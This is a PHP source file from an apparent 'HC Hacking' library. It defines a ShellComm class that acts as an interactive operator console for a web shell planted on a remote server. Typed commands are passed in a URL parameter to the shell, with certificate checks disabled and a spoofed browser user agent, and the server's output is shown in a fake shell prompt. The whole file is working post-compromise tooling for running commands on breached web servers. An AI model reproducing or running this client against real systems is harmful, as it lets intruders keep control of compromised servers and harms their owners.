<?php

#  ***************************************************************************
#  HC Hacking
#  Shellcomm: communicate with a remote shell
#  Copyright (C) <2017>  <Ivan Ariel Barrera Oro>
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#  ***************************************************************************

namespace HC\Hacking;

class ShellComm extends \HC\CLI\Colours
{
	protected $shell_url;
	protected $shell_param;
	protected $command;
	protected $host;
	protected $username;
	protected $ch;
	protected $response;
	protected $pwd = '';
	protected $colour;

	protected static function get_curl_opts($url) {
		return [
			CURLOPT_AUTOREFERER => 1,
			CURLOPT_MAXREDIRS => 5,
			CURLOPT_FOLLOWLOCATION => 0,
			CURLOPT_HEADER => 0,
			CURLOPT_FRESH_CONNECT => 1,
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_FORBID_REUSE => 0,
			CURLOPT_TIMEOUT => 10,
			CURLOPT_SSL_VERIFYPEER => 0,
			CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1; WOW64; ' .
								 'rv:29.0) Gecko/20120101 Firefox/57.0',
			CURLOPT_URL => $url
		];
	}

	public function __construct($shell_url = '', $shell_param = '') {
		$this->username = get_current_user();
		$this->ch = curl_init();
		$this->setShellUrl($shell_url);
		$this->setShellParam($shell_param);

		parent::__construct();
		$this->addTheme('response', ['light_cyan', 'bg_default']);
	}

	public function __destruct() {
		curl_close($this->ch);
	}

	protected function buildUrl() {
		return $this->shell_url . '?' . $this->shell_param . '='
				. urlencode($this->command);
	}

	public function setShellUrl($url) {
		$this->shell_url = $url;
		$host = parse_url($url);
		$this->host = isset($host['host']) ? $host['host'] : 'shellcomm';
	}

	public function setShellParam($param) {
		$this->shell_param = $param;
	}

	public function getResponse() {
		return isset($this->response) ? $this->response : '';
	}

	public function getErrorNumber() {
		return curl_errno($this->ch);
	}

	public function getErrorDescription() {
		return curl_error($this->ch);
	}

	public function readInput() {
		echo $this->colour(
			$this->username . '@' . $this->host . ':' . $this->pwd . '$ ',
			'shell'
		);
		$this->command = readline();
		return $this->command;
	}

	public function execute() {
		curl_setopt_array($this->ch, self::get_curl_opts($this->buildUrl()));
		$response = curl_exec($this->ch);
		$http_code = curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
		if ($http_code == 200) {
			$this->response = $this->colour($response, 'response');
		} else {
			$this->response = 
				$this->colour(
					'Got a http code ' . $http_code . ' and the response is',
					'warning'
				) . (
					empty($response)
						? $this->colour(' empty.', 'warning')
						: $this->colour(':', 'warning') . PHP_EOL
							. $this->colour($response, 'response')
				)
			;
		}
	}

	public function run() {
		/*
		$this->command = 'pwd';
		$this->execute();
		$this->pwd = $this->getResponse();
		//*/

		if($this->readInput() === false) {
			return false;
		}

		$this->execute();
		$errno = $this->getErrorNumber();
		if ($errno) {
			return $this->colour(
				'Error #' . $errno . ': ' . $this->getErrorDescription(),
				'error'
			);
		}

		return $this->getResponse();
	}
}
